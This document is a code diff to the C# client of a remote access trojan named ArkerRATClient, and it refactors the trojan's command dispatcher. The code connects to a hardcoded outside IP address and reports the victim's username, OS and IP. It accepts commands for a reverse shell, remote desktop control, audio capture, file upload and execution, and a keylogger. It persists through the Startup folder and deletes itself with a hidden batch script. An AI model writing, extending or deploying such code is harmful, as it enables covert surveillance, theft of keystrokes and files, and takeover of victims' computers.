@@ -26,6 +26,7 @@ namespace ArkerRATClient
 #if DEBUG
         private static int port = 2332;
         private static string ip = "78.72.90.139";
+
 #else
         private static int port = 0;
         private static string ip ="";
@@ -37,20 +38,21 @@ namespace ArkerRATClient
 
         public static async void ClientSession()
         {
-            
+
             try
             {
                 if (CheckIfDNS(ip))
                 {
-                    string dns= Dns.GetHostAddresses(ip)[0].ToString();
-                    int index = dns.LastIndexOf('\\');
-                    if(index != -1)
+
+                    int index = ip.LastIndexOf('/') + 1;
+                    if (index != -1)
                     {
-                        ip = dns.Substring(index);
+                        ip = ip.Substring(index);
+                        ip = Dns.GetHostAddresses(ip)[0].ToString();
                     }
                     else
                     {
-                        ip = dns;
+                        ip = Dns.GetHostAddresses(ip)[0].ToString();
                     }
                 }
 
@@ -61,7 +63,7 @@ namespace ArkerRATClient
                 SendClientInfo();
                 ReadData();
             }
-            catch(Exception ex)
+            catch (Exception ex)
             {
                 CloseConnection();
             }
@@ -74,7 +76,7 @@ namespace ArkerRATClient
 
             foreach (char chr in ipOrDNS)
             {
-                if(chr== '.')
+                if (chr == '.')
                 {
                     dotCNT++;
                 }
@@ -83,7 +85,7 @@ namespace ArkerRATClient
                     numberCNT++;
                 }
             }
-            if(dotCNT >= 3 && numberCNT > 5)
+            if (dotCNT >= 3 && numberCNT > 5)
             {
                 return false;
             }
@@ -110,46 +112,46 @@ namespace ArkerRATClient
                 address = address.Substring(first, last - first);
                 return address;
             }
-            catch(Exception ex)
+            catch (Exception ex)
             {
                 return "";
             }
-          
+
         }
         public static async Task SendData(string textData)
         {
-                try
-                {
-                    byte[] data = Encoding.UTF8.GetBytes(textData);
-                    await serverStream.WriteAsync(data, 0, data.Length);
-                    await serverStream.FlushAsync();
-                }
-                catch (Exception ex)
-                {
-                    CloseConnection();
-                }
+            try
+            {
+                byte[] data = Encoding.UTF8.GetBytes(textData);
+                await serverStream.WriteAsync(data, 0, data.Length);
+                await serverStream.FlushAsync();
+            }
+            catch (Exception ex)
+            {
+                CloseConnection();
+            }
         }
 
         static string data = string.Empty;
         static private async void ReadData()
         {
-                StringBuilder stringBuilder = new StringBuilder();
-                try
+            StringBuilder stringBuilder = new StringBuilder();
+            try
+            {
+                while (!noConnection)
                 {
-                    while (!noConnection)
+                    byte[] buffer = new byte[1024];
+                    int bytesRead = await serverStream.ReadAsync(buffer, 0, buffer.Length);
+
+                    if (bytesRead > 0)
                     {
-                        byte[] buffer = new byte[1024];
-                        int bytesRead = await serverStream.ReadAsync(buffer, 0, buffer.Length);
+                        string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead);
+                        stringBuilder.Append(receivedData);
 
-                        if (bytesRead > 0)
+                        lock (GlobalVariables._lock)
                         {
-                            string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead);
-                            stringBuilder.Append(receivedData);
-
-                            lock (GlobalVariables._lock)
-                            {
-                                data += stringBuilder.ToString();
-                            }
+                            data += stringBuilder.ToString();
+                        }
 
                         await Task.Run(() => SortData("§PingStart§", "§PingEnd§"));
 
@@ -170,12 +172,12 @@ namespace ArkerRATClient
                         await Task.Run(() => SortData("§SleepStart§", "§SleepEnd§"));
 
                         stringBuilder.Clear();
-                        }
-
-                        await Task.Delay(1);
                     }
+
+                    await Task.Delay(1);
                 }
-                catch (Exception ex) { CloseConnection(); }
+            }
+            catch (Exception ex) { CloseConnection(); }
         }
 
         public static bool uninstallFix = false;
@@ -188,209 +190,68 @@ namespace ArkerRATClient
                     int startIndex = data.IndexOf(startDelimiter) + startDelimiter.Length;
                     int endIndex = data.IndexOf(endDelimiter) - 1;
 
-                    if (startIndex != -1 && endIndex != -2 /*-2 because its always one less than the standard return -1 if you look at the squence abow*/&& startIndex <= endIndex+1)
+                    if (startIndex != -1 && endIndex != -2 /*-2 because its always one less than the standard return -1 if you look at the squence abow*/&& startIndex <= endIndex + 1)
                     {
                         string subString = string.Empty;
 
-                        
-                            subString = data.Substring(startIndex, endIndex - startIndex + 1);
-                            data = data.Replace(startDelimiter + subString + endDelimiter, string.Empty);
 
-                            //if (subString?.Length != null || subString?.Length != 0)
-                            if (startDelimiter == "§ReverseShellStart§")
-                        {
-                            ReverseShell.ReverseCMDSession(subString);
-                        }
-                        else if (startDelimiter == "§DisconnectStart§")
-                        {
-                            CloseConnection();
-                            Environment.Exit(0);
-                        }
-                        else if (startDelimiter == "§RemoteDesktopStart§")
-                        {
-                            if(subString.Length == 0&&!RemoteDesktop.sendingFrames)
-                            {
-                                RemoteDesktop.SendScreens();
-                            }
-                            else if (subString.Contains("§screen§"))
-                            {
-                                Task.Run(() => RemoteDesktop.StartScreenStreaming(50,subString.Replace("§screen§",string.Empty)));
-                            }
-                            else if (subString.Contains("§KI§"))
-                            {
-                              RemoteDesktop.EmulateKeyStrokes(subString.Replace("§KI§", string.Empty));
-                            }
-                            else if (subString.Contains("close")&&RemoteDesktop.sendingFrames)
-                            {
-                                RemoteDesktop.sendingFrames = false;
-                            }
-                            else if (subString.Contains("§ClickPositionStart§"))
-                                RemoteDesktop.EmulateClick(subString);
-                        }    
-                        else if (startDelimiter=="§RemoteAudioStart§")
-                        {
-                            if(subString.Length == 0)
-                            {
-                                RemoteAudio.ApplySettings();
-                                Task.Run(() => RemoteAudio.GetAndSendOutputDevices());
-                                Task.Run(() => RemoteAudio.GetAndSendInputDevices());
-                            }
-                            else if (subString.Contains("§ODS§"))
-                            {
-                                subString = subString.Replace("§ODS§", string.Empty);
-                                Task.Run(() => RemoteAudio.ChangeOutputDevice(subString));
+                        subString = data.Substring(startIndex, endIndex - startIndex + 1);
+                        data = data.Replace(startDelimiter + subString + endDelimiter, string.Empty);
 
-                            }
-                            else if (subString.Contains("§IDS§"))
-                            {
-                                subString = subString.Replace("§IDS§", string.Empty);
-
-                                Task.Run(() => RemoteAudio.ChangeInputDevice(subString));
-                            }
-                            else if (subString == "close")
-                            {
-                                Task.Run(()=>RemoteAudio.StopRemoteAudio());
-                            }
-
-                        }
-                        else if(startDelimiter == "§FileManagerStart§")
+                        switch (startDelimiter)
                         {
-                            if (subString.Contains("§ND§"))
-                            {
-                                subString = subString.Replace("§ND§", string.Empty);
-                                FileManager.CreateNewDirectory(subString);
-                            }
-                            else if (subString.Contains("§UF§"))
-                            {
-                                subString = subString.Replace("§UF§", string.Empty);
+                            case "§ReverseShellStart§":
+                                ReverseShell.HandleData(subString);
+                                break;
 
-                                if(subString.Contains("§start§")&&!FileManager.download)
-                                {
-                                    subString = subString.Replace("§start§", string.Empty);
-                                    Task.Run(()=> FileManager.StartDownloadingFile(subString));
-                                }
-                                else if (subString =="§end§")
-                                {
-                                    FileManager.download = false;
-                                    FileManager.dataBuffer = new System.Collections.Concurrent.ConcurrentQueue<string>();
-                                }
-                                else
-                                {
-                                    FileManager.dataBuffer.Enqueue(subString);
-                                }
-                            }
-                            else if (subString.Contains("§delete§"))
-                            {
-                                subString = subString.Replace("§delete§", string.Empty);
-                                FileManager.DeleteObject(subString);
-                            }
-                            else if (subString.Contains("§DF§"))
-                            {
-                                subString = subString.Replace("§DF§", string.Empty);
-                                FileManager.SendFileChunks(subString);
-                            }
-                            else if (subString.Contains("§exe§"))
-                            {
-                                subString = subString.Replace("§exe§", string.Empty);
-                                FileManager.ExecuteFile(subString);
+                            case "§DisconnectStart§":
+                                CloseConnection();
+                                Environment.Exit(0);
+                                break;
 
-                            }
-                            else if (subString =="close")
-                            {
-                                FileManager.CloseFileManager();
-                            }
-                            else
-                            {
-                                FileManager.SendFileSystem(subString);
-                            }
-                        }
-                        else if(startDelimiter == "§KeyLoggerStart§")
-                        {
-                            if (subString.Contains("§OFK§")) {
-                                subString = subString.Replace("§OFK§", string.Empty);
+                            case "§RemoteDesktopStart§":
+                                RemoteDesktop.HandleData(subString);
+                                break;
 
-                                if (subString == "close")
-                                {
-                                    KeyLogger.CloseOfflineKeyLogger();
-                                }
-                                else if(subString=="start")
-                                {
-                                    KeyLogger.StartOfflineKeylogger();
-                                }
-                            }
-                            else if(subString.Contains("§live§"))
-                            {
-                                subString = subString.Replace("§live§", string.Empty);
-                                
-                                if (subString == "close")
-                                {
-                                    KeyLogger.CloseLiveKeyLogger();
-                                }
-                                else if (subString == "start")
-                                {
-                                    KeyLogger.StartLiveKeyLogger();
-                                }
-                            }
-                            else if (subString == "start")
-                            {
-                                KeyLogger.keyLoggingThread = Task.Run(() => KeyLogger.StartKeyLogger());
-                            }
-                            else if(subString=="close")
-                            {
-                                KeyLogger.StopKeyLogger();
-                            }
-                            
-                        }
-                        else if (startDelimiter == "§PingStart§")
-                        {
-                            SendData("§PingStart§§PingEnd§");
-                        }
-                        //this bool will make it so that the client doesn't try to reconnect at Program.cs while it is uninstalling.
-                        else if (startDelimiter == "§UninstallStart§")
-                        {
-                            uninstallFix = true;
-                            CloseConnection();
+                            case "§RemoteAudioStart§":
+                                RemoteAudio.HandleData(subString);
+                                break;
 
-                            //DELETE EXE
-                            string batchCommands = string.Empty;
-                            string exeFileName = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");
+                            case "§FileManagerStart§":
+                                FileManager.HandleData(subString);
+                                break;
 
-                            batchCommands += "@ECHO OFF\n";                         // Do not show any output
-                            batchCommands += "ping 127.0.0.1 > nul\n";              // Wait approximately 4 seconds (so that the process is already terminated)
-                            batchCommands += "echo j | del /F ";                    // Delete the executeable
-                            batchCommands += AppDomain.CurrentDomain.FriendlyName + "\n";
-                            batchCommands += "echo j | del deleteMyProgram.bat";    // Delete this bat file
+                            case "§KeyLoggerStart§":
+                                KeyLogger.HandleData(subString);
+                                break;
 
-                            File.WriteAllText("deleteMyProgram.bat", batchCommands);
-                            ProcessStartInfo startInfo = new ProcessStartInfo("deleteMyProgram.bat");
-                            startInfo.CreateNoWindow = true;
-                            startInfo.UseShellExecute = false;
-                            startInfo.FileName = "deleteMyProgram.bat";
-                            Process.Start(startInfo);
+                            case "§PingStart§":
+                                SendData("§PingStart§§PingEnd§");
+                                break;
 
-                            File.Delete("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + AppDomain.CurrentDomain.FriendlyName);
+                            case "§UninstallStart§":
+                                Uninstall();
+                                break;
 
-                            Environment.Exit(0);
-                        }
-                        else if (startDelimiter == "§ReconnectStart§")
-                        {
-                            CloseConnection();
-                        }
-                        else if (startDelimiter=="§ShutDownStart§")
-                        {
-                            ShutDown();
-                        } 
-                        else if (startDelimiter=="§RestartStart§")
-                        {
-                            Restart();
-                        }
-                        else if (startDelimiter=="§LogOutStart§")
-                        {
-                            LogOut();
-                        } 
-                        else if (startDelimiter=="§SleepStart§")
-                        {
-                            Sleep();
+                            case "§ReconnectStart§":
+                                CloseConnection();
+                                break;
+
+                            case "§ShutDownStart§":
+                                ShutDown();
+                                break;
+
+                            case "§RestartStart§":
+                                Restart();
+                                break;
+
+                            case "§LogOutStart§":
+                                LogOut();
+                                break;
+
+                            case "§SleepStart§":
+                                Sleep();
+                                break;
                         }
                     }
                     else
@@ -398,10 +259,37 @@ namespace ArkerRATClient
                         return;
                     }
                 }
-                
 
-                
+
+
             } while (true);
+        }
+
+        private static void Uninstall()
+        {
+            uninstallFix = true;
+            CloseConnection();
+
+            //DELETE EXE
+            string batchCommands = string.Empty;
+            string exeFileName = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");
+
+            batchCommands += "@ECHO OFF\n";                         // Do not show any output
+            batchCommands += "ping 127.0.0.1 > nul\n";              // Wait approximately 4 seconds (so that the process is already terminated)
+            batchCommands += "echo j | del /F ";                    // Delete the executeable
+            batchCommands += AppDomain.CurrentDomain.FriendlyName + "\n";
+            batchCommands += "echo j | del deleteMyProgram.bat";    // Delete this bat file
+
+            File.WriteAllText("deleteMyProgram.bat", batchCommands);
+            ProcessStartInfo startInfo = new ProcessStartInfo("deleteMyProgram.bat");
+            startInfo.CreateNoWindow = true;
+            startInfo.UseShellExecute = false;
+            startInfo.FileName = "deleteMyProgram.bat";
+            Process.Start(startInfo);
+
+            File.Delete("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + AppDomain.CurrentDomain.FriendlyName);
+
+            Environment.Exit(0);
         }
 
         public static void CloseConnection()
@@ -409,11 +297,11 @@ namespace ArkerRATClient
             try
             {
                 RemoteAudio.StopRemoteAudio();
-               
+
                 tcpClient.Close();
                 serverStream.Close();
             }
-            catch(Exception ex)
+            catch (Exception ex)
             {
                 noConnection = true;
             }
@@ -422,8 +310,8 @@ namespace ArkerRATClient
 
         public static async void SendClientInfo()
         {
-             string HKLM_GetString(string path, string key)
-             {
+            string HKLM_GetString(string path, string key)
+            {
                 try
                 {
                     RegistryKey rk = Registry.LocalMachine.OpenSubKey(path);
@@ -431,10 +319,10 @@ namespace ArkerRATClient
                     return (string)rk.GetValue(key);
                 }
                 catch { return ""; }
-             }
+            }
 
-             string FriendlyName()
-             {
+            string FriendlyName()
+            {
                 string ProductName = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");
                 string CSDVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CSDVersion");
                 if (ProductName != "")
@@ -443,8 +331,8 @@ namespace ArkerRATClient
                                 (CSDVersion != "" ? " " + CSDVersion : "");
                 }
                 return "";
-             }
-            await SendData("§ClientInfoStart§"+"§ResulotionStart§" + Screen.PrimaryScreen.Bounds.Height + "," + Screen.PrimaryScreen.Bounds.Width + "§ResulotionEnd§" + Environment.UserName + "," + FriendlyName() + "," +SendIp()+"§ClientInfoEnd§");
+            }
+            await SendData("§ClientInfoStart§" + "§ResulotionStart§" + Screen.PrimaryScreen.Bounds.Height + "," + Screen.PrimaryScreen.Bounds.Width + "§ResulotionEnd§" + Environment.UserName + "," + FriendlyName() + "," + SendIp() + "§ClientInfoEnd§");
         }
 
         private static void ShutDown()
